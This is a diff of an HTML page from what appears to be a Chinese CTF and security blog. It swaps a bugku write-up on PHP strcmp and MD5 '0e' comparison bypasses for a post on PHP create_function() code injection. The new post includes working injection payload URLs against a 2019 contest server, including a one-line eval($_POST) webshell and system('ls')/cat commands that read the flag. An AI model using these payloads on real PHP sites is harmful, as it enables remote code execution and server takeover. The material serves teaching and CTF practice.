@@ -14,7 +14,7 @@
 	<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1.0, user-scalable=no">
   <title>
     
-      bugku中的前女友(SKCTF) | 似雍&amp;&amp;非庸
+      php create_function()代码注入 | 似雍&amp;&amp;非庸
     
   </title>
   <meta name="author" content="Alex">
@@ -115,7 +115,7 @@
 				<!-- Page title -->
 				<p>
 					
-						当前文章&nbsp;:&nbsp;《bugku中的前女友(SKCTF)》
+						当前文章&nbsp;:&nbsp;《php create_function()代码注入》
 					
 				</p>
 				<!-- Progress bar -->
@@ -278,8 +278,8 @@
 	
 	<div class="article-title">
 		
-	<a href="/2018/11/21/bugku中的前女友-SKCTF/" itemprop="url">
-		bugku中的前女友(SKCTF)
+	<a href="/2019/04/08/php-create-function-代码注入/" itemprop="url">
+		php create_function()代码注入
 	</a>
 
 	</div>
@@ -288,17 +288,17 @@
 		<span>
 			
 	发布于
-	<a href="/2018/11/21/bugku中的前女友-SKCTF/" itemprop="url">
-		<time datetime="2018-11-21T12:13:28.000Z" itemprop="datePublished">
-	  		2018-11-21
+	<a href="/2019/04/08/php-create-function-代码注入/" itemprop="url">
+		<time datetime="2019-04-08T06:17:14.000Z" itemprop="datePublished">
+	  		2019-04-08
 	  </time>
 	</a> 
 
 	/
 	更新于
-	<a href="/2018/11/21/bugku中的前女友-SKCTF/" itemprop="url">
-		<time datetime="2018-11-21T12:13:28.000Z" itemprop="dateUpdated">
-	  		2019-04-05
+	<a href="/2019/04/08/php-create-function-代码注入/" itemprop="url">
+		<time datetime="2019-04-08T06:17:14.000Z" itemprop="dateUpdated">
+	  		2019-04-08
 	  </time>
 	</a> 	
 
@@ -308,8 +308,8 @@
 			<i class="fa fa-tags"></i>
 			
 	
-		<a href="/tags/ctf/" class=" ">
-			ctf
+		<a href="/tags/php/" class=" ">
+			php
 		</a>
 	
 		
@@ -317,7 +317,7 @@
 		/
 		
 
-    <span class="leancloud_visitors" id="/2018/11/21/bugku中的前女友-SKCTF/_visitors" data-url="/2018/11/21/bugku中的前女友-SKCTF/" data-title="bugku中的前女友(SKCTF)">
+    <span class="leancloud_visitors" id="/2019/04/08/php-create-function-代码注入/_visitors" data-url="/2019/04/08/php-create-function-代码注入/" data-title="php create_function()代码注入">
         热度
         <i class="leancloud_visitors_count" id="leancloud_visitors_count">0</i>
     </span>
@@ -326,7 +326,7 @@
 
 
 
-    <span class="leancloud_likes" id="/2018/11/21/bugku中的前女友-SKCTF/_likes" data-url="/2018/11/21/bugku中的前女友-SKCTF/" data-title="bugku中的前女友(SKCTF)" rel="unlike">
+    <span class="leancloud_likes" id="/2019/04/08/php-create-function-代码注入/_likes" data-url="/2019/04/08/php-create-function-代码注入/" data-title="php create_function()代码注入" rel="unlike">
         喜欢
         <i class="fa fa-heart"></i>
         <i class="leancloud_likes_count" id="leancloud_likes_count">0</i>
@@ -335,80 +335,84 @@
 	</div>
 
 	<div class="article-content" id="article-content">
-		<h2 id="知识储备"><a href="#知识储备" class="headerlink" title="知识储备"></a>知识储备</h2><h3 id="strcmp-函数"><a href="#strcmp-函数" class="headerlink" title="strcmp()函数"></a>strcmp()函数</h3><pre class="line-numbers language-php"><code class="language-php">int <span class="token function">strcmp</span> <span class="token punctuation">(</span> string <span class="token variable">$str1</span> <span class="token punctuation">,</span> string <span class="token variable">$str2</span> <span class="token punctuation">)</span>
+		<h2 id="create-function代码注入"><a href="#create-function代码注入" class="headerlink" title="create_function代码注入"></a>create_function代码注入</h2><p>string create_function(string $args , string $code)</p>
+<p>$args 变量部分</p>
+<p>$code 方法代码部分</p>
+<p>返回值：<br>以字符串形式返回唯一的函数名，如果出现错误，则返回false。</p>
+<p>在PHP中使用create_function()创建匿名函数，seay大牛的解释</p>
+<ul>
+<li>获取参数, 函数体;</li>
+<li>拼凑一个”function __lambda_func (参数) { 函数体;} “的字符串;</li>
+<li>eval;</li>
+<li>通过__lambda_func在函数表中找到eval后得到的函数体, 找不到就出错;</li>
+<li>定义一个函数名:”\000_lambda_” . count(anonymous_functions)++;</li>
+<li>用新的函数名替换__lambda_func;</li>
+<li>返回新的函数。</li>
+</ul>
+<p>例：</p>
+<pre class="line-numbers language-php"><code class="language-php"><span class="token function">create_function</span><span class="token punctuation">(</span><span class="token string">'$name'</span><span class="token punctuation">,</span><span class="token string">'echo $name."alex"'</span><span class="token punctuation">)</span>
 <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-<p><strong>说明</strong></p>
-<p>注意该比较区分大小写。</p>
-<p><strong>参数</strong></p>
-<p>str1</p>
-<p>第一个字符串。</p>
-<p>str2</p>
-<p>第二个字符串。</p>
-<p><strong>返回值</strong></p>
-<p>strcmp二进制安全字符串比较，如果 str1 小于 str2 返回 &lt; 0； 如果 str1 大于 str2 返回 &gt; 0；如果两者相等，返回 0。</p>
-<p><strong>漏洞：当这个函数接受到了不符合的类型，这个函数将发生错误，但是在5.3之前的php中，显示了报错的警告信息后，将return 0 !!!!所以可以传入数组让其返回值为0。</strong></p>
-<p>这一个漏洞适用与5.3之前版本的php</p>
-<h3 id="if判断"><a href="#if判断" class="headerlink" title="if判断"></a>if判断</h3><pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>
-<span class="token variable">$a</span><span class="token operator">=</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">;</span>
-<span class="token variable">$b</span><span class="token operator">=</span><span class="token number">1</span>
-<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token variable">$a</span> <span class="token keyword">or</span> <span class="token operator">!</span><span class="token variable">$b</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
-    <span class="token keyword">echo</span> <span class="token string">"true"</span><span class="token punctuation">;</span>
+<p>等同与创建了一个函数：</p>
+<pre class="line-numbers language-php"><code class="language-php"><span class="token keyword">function</span> <span class="token function">fT</span><span class="token punctuation">(</span><span class="token variable">$fname</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+  <span class="token keyword">echo</span> <span class="token variable">$fname</span><span class="token punctuation">.</span><span class="token string">"Zhang"</span><span class="token punctuation">;</span>
 <span class="token punctuation">}</span>
-<span class="token delimiter">?></span>
-<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-<p>无输出。即：!$a为假和$b为假。!0为真。</p>
-<h3 id="与"><a href="#与" class="headerlink" title="== 与 ==="></a>== 与 ===</h3><p> php中有两种比较的符号 == 与 === ，=== 在进行比较的时候，会先判断两种字符串的类型是否相等，再比较。</p>
-<p>== 在进行比较的时候，会先将字符串类型转化成相同，再比较。这里举个例子，为什么下面的结果是true。</p>
-<pre class="line-numbers language-php"><code class="language-php"><span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token string">"0e123456"</span><span class="token operator">==</span><span class="token string">"0e4456789"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//true</span>
-<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-<p>“0e123456”==”0e456789”相互比较的时候，会将0e这类字符串识别为科学技术法的数字，0的无论多少次方都是零，所以相等。</p>
-<p>介绍一批md5开头是0e的字符串 上文提到过，0e在比较的时候会将其视作为科学计数法，所以无论0e后面是什么，0的多少次方还是0。</p>
-<pre class="line-numbers language-php"><code class="language-php"><span class="token constant">QNKCDZO</span>
-<span class="token number">0e830400451993494058024219903391</span>
 
-s878926199a
-<span class="token number">0e545993274517709034328855841020</span>
-
-s155964671a
-<span class="token number">0e342768416822451524974117254469</span>
-
-s214587387a
-<span class="token number">0e848240448830537924465865611904</span>
-
-s214587387a
-<span class="token number">0e848240448830537924465865611904</span>
-
-s878926199a
-<span class="token number">0e545993274517709034328855841020</span>
-
-s1091221200a
-<span class="token number">0e940624217856561557816327384675</span>
-
-s1885207154a
-<span class="token number">0e509367213418206700842008763514</span>
-<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-<h3 id="MD5加密"><a href="#MD5加密" class="headerlink" title="MD5加密"></a>MD5加密</h3><p>md5()函数无法对数组进行加密。即：加密结果都一样为空。</p>
-<h2 id="解题思路"><a href="#解题思路" class="headerlink" title="解题思路"></a>解题思路</h2><p>打开题目查看源代码发现存在一个链接code.txt,进入code.txt。发现：</p>
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
+<p>并返回这个函数名。</p>
+<p>测试代码：</p>
 <pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>
-<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'v1'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'v2'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'v3'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
-    <span class="token variable">$v1</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'v1'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
-    <span class="token variable">$v2</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'v2'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
-    <span class="token variable">$v3</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'v3'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
-    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$v1</span> <span class="token operator">!=</span> <span class="token variable">$v2</span> <span class="token operator">&amp;&amp;</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$v1</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$v2</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
-        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">strcmp</span><span class="token punctuation">(</span><span class="token variable">$v3</span><span class="token punctuation">,</span> <span class="token variable">$flag</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
-            <span class="token keyword">echo</span> <span class="token variable">$flag</span><span class="token punctuation">;</span>
-        <span class="token punctuation">}</span>
-    <span class="token punctuation">}</span>
-<span class="token punctuation">}</span>
+<span class="token variable">$id</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'id'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+<span class="token variable">$str2</span><span class="token operator">=</span><span class="token string">'echo  $a'</span><span class="token punctuation">.</span><span class="token string">'test'</span><span class="token punctuation">.</span><span class="token variable">$id</span><span class="token punctuation">.</span><span class="token string">";"</span><span class="token punctuation">;</span>
+<span class="token keyword">echo</span> <span class="token variable">$str2</span><span class="token punctuation">;</span>
+<span class="token keyword">echo</span> <span class="token string">"&lt;br/>"</span><span class="token punctuation">;</span>
+<span class="token keyword">echo</span> <span class="token string">"=============================="</span><span class="token punctuation">;</span>
+<span class="token keyword">echo</span> <span class="token string">"&lt;br/>"</span><span class="token punctuation">;</span>
+<span class="token variable">$f1</span> <span class="token operator">=</span> <span class="token function">create_function</span><span class="token punctuation">(</span><span class="token string">'$a'</span><span class="token punctuation">,</span><span class="token variable">$str2</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
 <span class="token delimiter">?></span>
-<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-<p>绕过payload：<a href="http://118.89.219.210:49162/?v1=s1885207154a&amp;v2=s1091221200a&amp;v3[]=1（payload有很多种）" target="_blank" rel="noopener">http://118.89.219.210:49162/?v1=s1885207154a&amp;v2=s1091221200a&amp;v3[]=1（payload有很多种）</a></p>
-<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>php是门强大的语言，神奇无比。需要继续学习。</p>
-<p>如果有误请指出。</p>
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>环境：php5.2或5.3或5.4+apache或Nginx</p>
+<p>playload：<a href="http://localhost/1.php?id=;}phpinfo();/" target="_blank" rel="noopener">http://localhost/1.php?id=;}phpinfo();/</a>*</p>
+<p>注入原理：</p>
+<pre class="line-numbers language-php"><code class="language-php">原函数：
+<span class="token keyword">function</span> <span class="token function">fT</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
+  <span class="token keyword">echo</span> <span class="token variable">$a</span><span class="token punctuation">.</span><span class="token string">"test"</span><span class="token punctuation">.</span><span class="token variable">$id</span><span class="token punctuation">;</span>
+<span class="token punctuation">}</span>
+
+代码注入后<span class="token punctuation">:</span>
+<span class="token keyword">function</span> <span class="token function">fT</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
+  <span class="token keyword">echo</span> <span class="token variable">$a</span><span class="token punctuation">.</span><span class="token string">"test"</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token function">phpinfo</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token operator">/</span><span class="token operator">*</span><span class="token punctuation">;</span>
+<span class="token punctuation">}</span>
+
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<h3 id="例题"><a href="#例题" class="headerlink" title="例题"></a>例题</h3><p>2019掘安杯题：</p>
+<pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>
+<span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'action'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+    <span class="token variable">$action</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'action'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+<span class="token punctuation">}</span>
+
+<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'action'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
+    <span class="token variable">$arg</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'arg'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+<span class="token punctuation">}</span>
+
+<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string">'/^[a-z0-9_]*$/isD'</span><span class="token punctuation">,</span> <span class="token variable">$action</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
+    <span class="token function">show_source</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>
+    <span class="token variable">$action</span><span class="token punctuation">(</span><span class="token variable">$arg</span><span class="token punctuation">,</span><span class="token string">''</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token punctuation">}</span> 
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>/i不区分大小写</p>
+<p>/s匹配任何不可见字符，包括空格、制表符、换页符等等，等价于[fnrtv]</p>
+<p>/D如果使用$限制结尾字符,则不允许结尾有换行;</p>
+<p>根据create_function()代码注入，需要绕过对$action参数的正则过滤，在数字字母下划线都被禁用的情况下调用函数，思路是想办法在开头或结尾插入字符绕过正则.<br>通过测试会发现在函数开头加上字符\可以绕过，也就是%5C,原因涉及到了php的全局命名空间，\create_function就是调用全局的create_function函数.<br>手册：<br><img src="https://s2.ax1x.com/2019/04/08/A59cIP.png" alt="A59cIP.png"><br>注意php版本。。。(入坑者的提醒)</p>
+<p>执行phpinfo()<br>playload:<a href="http://120.79.1.69:10006/?action=\create_function&amp;arg=){};phpinfo();/" target="_blank" rel="noopener">http://120.79.1.69:10006/?action=\create_function&amp;arg=){};phpinfo();/</a>*</p>
+<p>){}应该是闭合create_function的 。</p>
+<p><img src="https://s2.ax1x.com/2019/04/08/A59XzF.png" alt="A59XzF.png"><br>然后传马，或者直接看flag；<br><a href="http://120.79.1.69:10006/?action=\create_function&amp;arg=){};eval($_POST[%27a%27]);/" target="_blank" rel="noopener">http://120.79.1.69:10006/?action=\create_function&amp;arg=){};eval($_POST[%27a%27]);/</a>*<br>但有的时候马连不上。。。。</p>
+<p>看文件夹下的内容<br><a href="http://120.79.1.69:10006/?action=\create_function&amp;arg=){};var_dump(scandir(%22./%22));/" target="_blank" rel="noopener">http://120.79.1.69:10006/?action=\create_function&amp;arg=){};var_dump(scandir(%22./%22));/</a><em><br>或<br><a href="http://120.79.1.69:10006/?action=\create_function&amp;arg=){};var_dump(system(%22ls%22));/" target="_blank" rel="noopener">http://120.79.1.69:10006/?action=\create_function&amp;arg=){};var_dump(system(%22ls%22));/</a></em><br>看flag<br><a href="http://120.79.1.69:10006/?action=\create_function&amp;arg=){};var_dump(file(%22./Th1s_1S_F1a9_Hav3_Fun%22));/" target="_blank" rel="noopener">http://120.79.1.69:10006/?action=\create_function&amp;arg=){};var_dump(file(%22./Th1s_1S_F1a9_Hav3_Fun%22));/</a><em><br>或<br><a href="http://120.79.1.69:10006/?action=\create_function&amp;arg=){};var_dump(system(%22cat%20./Th1s_1S_F1a9_Hav3_Fun%22));/" target="_blank" rel="noopener">http://120.79.1.69:10006/?action=\create_function&amp;arg=){};var_dump(system(%22cat%20./Th1s_1S_F1a9_Hav3_Fun%22));/</a></em></p>
 	
 	</div>
 	
-	<div id="current-post-cover" data-scr="/images/post-cover/11.jpg"></div>
+	<div id="current-post-cover" data-scr="/images/post-cover/20.jpg"></div>
 
 	<!-- relate post, comment...-->
 	<div class="investment-container">
@@ -422,12 +426,8 @@ s1885207154a
 	<span>
 		<a href="javascript: window.scrollTo(0, 0);">返回顶部</a>
 		
-			<a href="/2018/11/23/insert-into-注入/" title="insert into 注入" rel="prev">
-				&laquo;上一篇
-			</a>
 		
-		
-			<a href="/2018/11/21/php序列化和反序列化/" title="php序列化和反序列化" rel="next">
+			<a href="/2019/04/01/2019年上海嘉韦思杯writeup/" title="2019年上海嘉韦思杯writeup" rel="next">
 				下一篇&raquo;
 			</a>
 			
@@ -445,6 +445,34 @@ s1885207154a
 		
 				<li>
 					<div>
+						<a href="/2018/10/28/php之正则匹配/" title="php之正则匹配">
+							php之正则匹配
+						</a>
+						<p>
+							注：文章存在转义以网页显示为表准写法
+正则表达式:1.原子
+2.元子符
+3.模式修正符
+原子:.           匹配除换行符以外的任意字符
+a-z
+A-Z
+0-9
+[0-9]
+[^0-9]
+\d   匹配数字
+\D
+\w   匹...
+						</p>
+					</div>
+
+					<a href="/2018/10/28/php之正则匹配/" title="php之正则匹配">				
+						<img src="/images/post-cover/4.jpg" class="relateImg" alt="php之正则匹配">
+					</a>
+				</li>											
+		
+		
+				<li>
+					<div>
 						<a href="/2019/04/01/2019年上海嘉韦思杯writeup/" title="2019年上海嘉韦思杯writeup">
 							2019年上海嘉韦思杯writeup
 						</a>
@@ -458,6 +486,46 @@ s1885207154a
 
 					<a href="/2019/04/01/2019年上海嘉韦思杯writeup/" title="2019年上海嘉韦思杯writeup">				
 						<img src="/images/post-cover/14.jpg" class="relateImg" alt="2019年上海嘉韦思杯writeup">
+					</a>
+				</li>											
+		
+		
+				<li>
+					<div>
+						<a href="/2019/03/26/nmap的使用/" title="nmap的使用">
+							nmap的使用
+						</a>
+						<p>
+							前言端口范围：1-65535
+常见的端口以及服务：
+
+21 — ftp协议
+22 — ssh远程登陆端口(linux)
+23 — telnet协议
+25 — 邮箱协议 smtp 发送邮件
+110 — pop3协议 接收邮件
+80 — ...
+						</p>
+					</div>
+
+					<a href="/2019/03/26/nmap的使用/" title="nmap的使用">				
+						<img src="/images/post-cover/6.jpg" class="relateImg" alt="nmap的使用">
+					</a>
+				</li>											
+		
+		
+				<li>
+					<div>
+						<a href="/2019/03/17/xss的绕过和利用/" title="xss的绕过和利用">
+							xss的绕过和利用
+						</a>
+						<p>
+							xssXSS攻击全称跨站脚本攻击，是为不和层叠样式表(Cascading Style Sheets, CSS)的缩写混淆，故将跨站脚本攻击缩写为XSS，XSS是一种在web应用中的计算机安全漏洞，它允许恶意web用户将代码植入到提供给...
+						</p>
+					</div>
+
+					<a href="/2019/03/17/xss的绕过和利用/" title="xss的绕过和利用">				
+						<img src="/images/post-cover/19.jpg" class="relateImg" alt="xss的绕过和利用">
 					</a>
 				</li>											
 		
@@ -501,6 +569,27 @@ c:\wind...
 		
 				<li>
 					<div>
+						<a href="/2018/11/28/十大挖矿神器/" title="十大挖矿神器">
+							十大挖矿神器
+						</a>
+						<p>
+							十大挖洞必备神器
+0x00 Burp Suite
+
+
+Burp Suite 是用于攻击web 应用程序的集成平台。它包含了许多工具，并为这些工具设计了许多接口，以促进加快攻击应用程序的过程。
+也就是说，Burp Suite是web应用...
+						</p>
+					</div>
+
+					<a href="/2018/11/28/十大挖矿神器/" title="十大挖矿神器">				
+						<img src="/images/post-cover/16.jpg" class="relateImg" alt="十大挖矿神器">
+					</a>
+				</li>											
+		
+		
+				<li>
+					<div>
 						<a href="/2018/11/23/insert-into-注入/" title="insert into 注入">
 							insert into 注入
 						</a>
@@ -523,121 +612,48 @@ function ge...
 		
 				<li>
 					<div>
-						<a href="/2018/11/20/bugku中的welcome-to-bugkuctf/" title="bugku中的welcome to bugkuctf">
-							bugku中的welcome to bugkuctf
+						<a href="/2018/11/21/bugku中的前女友-SKCTF/" title="bugku中的前女友(SKCTF)">
+							bugku中的前女友(SKCTF)
 						</a>
 						<p>
-							知识储备本地包含file_get_contents() 函数定义和用法
-file_get_contents() 函数把整个文件读入一个字符串中。和 file() 一样，不同的是 file_get_contents() 把文件读入一个字...
+							知识储备strcmp()函数int strcmp ( string $str1 , string $str2 )
+
+说明
+注意该比较区分大小写。
+参数
+str1
+第一个字符串。
+str2
+第二个字符串。
+返回值
+strcmp二进制安全...
 						</p>
 					</div>
 
-					<a href="/2018/11/20/bugku中的welcome-to-bugkuctf/" title="bugku中的welcome to bugkuctf">				
-						<img src="/images/post-cover/12.jpg" class="relateImg" alt="bugku中的welcome to bugkuctf">
+					<a href="/2018/11/21/bugku中的前女友-SKCTF/" title="bugku中的前女友(SKCTF)">				
+						<img src="/images/post-cover/11.jpg" class="relateImg" alt="bugku中的前女友(SKCTF)">
 					</a>
 				</li>											
 		
 		
 				<li>
 					<div>
-						<a href="/2018/11/12/hctf2018web/" title="hctf2018web">
-							hctf2018web
+						<a href="/2018/11/21/php序列化和反序列化/" title="php序列化和反序列化">
+							php序列化和反序列化
 						</a>
 						<p>
-							首先，来说说本次比赛吧。    
+							序列化在PHP中，序列化用于存储或传递 PHP 的值的过程中，同时不丢失其类型和结构。
+序列化函数：string serialize ( mixed $value )
 
-没有学到百度的真谛。（什么漏洞百度几乎都有，遇到不会就百度。发现源码也可百度理解）    
-发现可测试的地方要通过各种手段进行尝试。
-ctf题与真正的漏洞有差距。需要换种思维来考虑问题。
-
-然后，就...
+说明：
+返回对象的字符串表示。 
+返回值：
+返回对象的字符串表示...
 						</p>
 					</div>
 
-					<a href="/2018/11/12/hctf2018web/" title="hctf2018web">				
-						<img src="/images/post-cover/8.jpg" class="relateImg" alt="hctf2018web">
-					</a>
-				</li>											
-		
-		
-				<li>
-					<div>
-						<a href="/2018/10/15/护网杯签到题/" title="护网杯签到题">
-							护网杯签到题
-						</a>
-						<p>
-							首先，护网杯对新手不友好。看题看到绝望！！！全程懵逼状态。好啦不吐槽啦。。。。
-进入正题：迟来的签到题
-首先从文件下载下来看着像base64.但通过base64解码工具解码出来
-    V_UPVSUSUQR^W_###QV'R...
-						</p>
-					</div>
-
-					<a href="/2018/10/15/护网杯签到题/" title="护网杯签到题">				
-						<img src="/images/post-cover/18.jpg" class="relateImg" alt="护网杯签到题">
-					</a>
-				</li>											
-		
-		
-				<li>
-					<div>
-						<a href="/2018/10/12/bugku备份是个好好习惯/" title="bugku备份是个好习惯">
-							bugku备份是个好习惯
-						</a>
-						<p>
-							本题提示备份：    首先，可以用御剑等工具进行扫描,发现存在备份泄露，然后可以进行index.php.bak。对原码进行下载分析。
-&lt;?php
-/**
- * Created by PhpStorm.
- * User: Nors...
-						</p>
-					</div>
-
-					<a href="/2018/10/12/bugku备份是个好好习惯/" title="bugku备份是个好习惯">				
-						<img src="/images/post-cover/13.jpg" class="relateImg" alt="bugku备份是个好习惯">
-					</a>
-				</li>											
-		
-		
-				<li>
-					<div>
-						<a href="/2019/04/08/php-create-function-代码注入/" title="php create_function()代码注入">
-							php create_function()代码注入
-						</a>
-						<p>
-							create_function代码注入string create_function(string $args , string $code)
-$args 变量部分
-$code 方法代码部分
-返回值：以字符串形式返回唯一的函数名，如果出...
-						</p>
-					</div>
-
-					<a href="/2019/04/08/php-create-function-代码注入/" title="php create_function()代码注入">				
-						<img src="/images/post-cover/20.jpg" class="relateImg" alt="php create_function()代码注入">
-					</a>
-				</li>											
-		
-		
-				<li>
-					<div>
-						<a href="/2019/03/26/nmap的使用/" title="nmap的使用">
-							nmap的使用
-						</a>
-						<p>
-							前言端口范围：1-65535
-常见的端口以及服务：
-
-21 — ftp协议
-22 — ssh远程登陆端口(linux)
-23 — telnet协议
-25 — 邮箱协议 smtp 发送邮件
-110 — pop3协议 接收邮件
-80 — ...
-						</p>
-					</div>
-
-					<a href="/2019/03/26/nmap的使用/" title="nmap的使用">				
-						<img src="/images/post-cover/6.jpg" class="relateImg" alt="nmap的使用">
+					<a href="/2018/11/21/php序列化和反序列化/" title="php序列化和反序列化">				
+						<img src="/images/post-cover/5.jpg" class="relateImg" alt="php序列化和反序列化">
 					</a>
 				</li>											
 		
